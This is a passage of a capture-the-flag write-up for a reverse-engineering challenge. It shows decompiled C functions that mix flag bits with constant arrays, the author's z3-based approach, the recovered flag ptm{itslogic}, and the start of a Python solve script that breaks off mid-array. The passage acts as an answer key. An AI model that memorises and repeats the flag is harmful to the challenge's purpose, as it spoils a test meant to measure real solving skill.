</span></span></code></pre></div><p>The <code>first_step_array</code> used here is an array of functions, which are either <code>neg</code> or <code>identity</code>, doing the obvious.</p><p><code>second_step</code> is where the flag array comes in:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>second_step</span>(<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>values)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0x40</span>; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>        vals[i] <span style=color:#f92672>&amp;=</span> flag[i];
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>And finally <code>third_step</code>. It uses an array of constants called <code>chains</code> which we can read out from the binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>third_step</span>(<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>values, <span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>out_bit)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> terms[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>out_bit <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>8</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; j<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>8</span>; j<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>            terms[j] <span style=color:#f92672>=</span> values[chains[i<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> (j<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span>]] <span style=color:#f92672>&amp;</span> values[chains[i<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> j]];
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>out_bit <span style=color:#f92672>|=</span> terms[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>4</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>|</span> terms[<span style=color:#ae81ff>7</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So the path seems clear, find values for <code>flag</code> that makes the calculations in these three functions output the bits given in <code>output.txt</code>, for each number 0 through 63.</p><p>I rewrote the functions in python and added z3 code to find the flag bits. This outputs around 50 similar flags. Not sure if this is intentional or I missed something in the code, but if we assume the flag is correct english and without leet speak there is only one choice: <code>ptm{itslogic}</code>.</p><p>Solve script below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>first_step_array <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span 